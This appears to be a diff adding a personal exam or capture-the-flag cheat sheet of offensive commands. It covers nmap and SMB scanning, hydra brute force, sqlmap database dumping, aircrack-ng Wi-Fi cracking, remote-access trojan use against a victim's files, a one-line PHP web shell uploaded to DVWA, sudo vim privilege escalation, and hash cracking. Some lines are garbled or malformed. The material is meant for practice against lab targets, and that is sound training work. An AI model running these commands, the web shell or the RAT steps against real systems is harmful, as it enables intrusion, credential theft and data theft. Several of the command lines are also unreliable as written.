@@ -1,0 +1,136 @@
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+Find Command: 
+find /sdcard/ -name "*.jpg" -o -name "*.png
+find / -type f -name file-name.txt 2> /dev/null
+find / -name "file-name" 2>/dev/null
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+Base64 decode:
+cat output.txt | base64 -d 
+cat filename.txt | base64 --decode > decoded.txt
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+NMAP:
+nmap -p 389 -sV IP 
+nmap -sV -A -T4 IP 
+nmap -p 80 -sV IP
+nmap -sV -p 25,80,110,143 IP 
+nmap -Pn - -script vuln IP >> to get the CVE vuln
+nmap -sV --script=http-enum IP >> to scan web-app and exploit input parameter
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+SMB:
+nmap -p 139,445 --open -sV IP | sudo nmap -T4 -Ss -p 139,445 - -script vuln IP
+hydra -L -P IP smb
+smbclient -L Target IP - U Username
+smbclient //Target Ip/Share-name -U Username
+smbclient //IP/share -U user1 -c 'recurse; ls'
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+SQL:
+# In cybe. subdomain vich
+wapiti -u <url> -m sql (This Will give the vulnerable parameter) 
+------------------------------------------------------------
+1. Go to blog page
+2. Copy the url with parameter id.
+3. And go to JSQL injection tool in parrot os.
+4. Then past the url and click attack you will get all databases.
+5. Now search the flag database copy the flag and paste
+------------------------------------------------------------ 
+sqlmap -u "http://Only-Put-IP" --crawl=3 --level=5 --risk=3 --dbs
+sqlmap -u "http://Only-Put-IP" --crawl=3 --level=5 --risk=3 -D database_name -
+-tables
+sqlmap -u "http://Only-Put-IP" --crawl=3 --level=5 --risk=3 -D database_name -
+T table_name --columns
+sqlmap -u "http://Only-Put-IP" --crawl=3 --level=5 --risk=3 -D database_name -
+T table_name -C Flag --dump
+_____________________________________________________________
+# To find the page_id (page_id wala domain) 
+/index.php? , view page-source it , and find the flag OR 
+1. nmap -sV --script=http-enum [target domain or IP address]
+2. Find any input parameter on website and capture the request in burp and then use it to perform sql
+injection using sqlmap.
+3. Now open the burp and check the input parameters and intercept on then type some as “1 OR ANY TEXT”
+you get some value on burp copy that and create the txt file.(1 OR 1=1 #)
+4. sqlmap -r <txt file from burpsuite> --dbs
+5. sqlmap -r <txt file from burpsuite> -D <database name> --tables
+6. sqlmap -r <txt file from burpsuite> -D <database name> -T <table name> --columns
+7. sqlmap -r <txt file from burpsuite> -D <database name> -T <table name> --dump-all
+8. then login and do the url parameter change page_id=1 to page_id=84
+9. view page-source it , and find the flag
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+PhoneSploit:
+7. ent -h or apt install ent
+8. ent file1.elf
+9. ent file2.elf
+10. ent file3.elf
+11. sha384sum file.elf
+12. then you get one hash value type last 4 characters.
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+DIE tool (detect it easy)
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+StegHide [OpenStego]:
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+Snow Tool [StegSnow Tool]:
+snow.exe -C -p "given_password" hidden_text.txt -> win (Do check, not sure)
+stegsnow -p password -C restricted.txt output.txt -> linux 
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+Wireshark:
+# find the high number of packets send to IP address 
+1. Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given
+2. tcp.flags.syn == 1 and tcp.flags.ack == 0
+____________________________________________________________
+# find the least IPv4 packet count 
+ip.dst == dst ip in ques
+Open IPv4 Conversation
+Statistics > Conversations > IPv4 tab
+click on packets , find the least no. of packet 
+mqtt
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+Aircrack-ng:
+1. aircrack-ng /home/wireless.cap
+2. aircrack-ng -b 6c:24:a6:3e:01:59 -w /home/wifipass.txt /home/wireless.cap
+------------------------------------------------------------ 
+airodump-ng W!F!_Pcap.cap
+airodump-ng --bssid BSSID --channel CHANNEL -w outputfile W!F!_Pcap.cap
+aircrack-ng -w /path/to/wordlist.txt outputfile-01.cap
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+RAT [Trojan]:
+● njRAT: Reverse shell.
+● MoSucker
+● ProRat: Requires victim’s IP.
+● Theef: Requires victim’s IP.
+● HTTP RAT: Requires victim’s IP
+● Theef tool 
+main ports check 9871,6703
+Thief RAT -> Connect to IP -> Authenticate
+Thief RAT -> File Manager -> Navigate to C:\Users\Username\Documents\Scan
+Thief RAT -> File Manager -> Open "Scan" folder -> Count files
+OR use cmd -> dir /b/s “file-name*” (do not put type .txt in the file-name)
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+DVWA:
+set level to -> easy
+Upload PHP shell:
+<?php system($_GET['cmd']); ?>
+Access it via:
+http://target.com/uploads/shell.php?cmd=whoami
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+Privilege Escalation:
+1. Check sudo privileges
+sudo -l
+2. Switch to root if possible
+sudo -i 
+OR sudo -u user /bin/bash (ask google for correct formatting)
+3. If sudo for vim is allowed
+sudo vim
+Press :
+Type :!sh or :!bash
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+Decrypt Hash:
+https://hashes.com/en/decrypt/hash [To find Hash Type / Decrypt]
+md5sum file-name
+sha384sum file-name
+BCtextEncoder for .txt files 
+hashcat -a 0 -m <hash-type> <hash-file> <wordlist>
+john --wordlist=<wordlist_file> <hash_file>
+john --show <hash_file>
+john --format=Raw-MD5 --wordlist=rockyou.txt Hash2crack.txt
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+
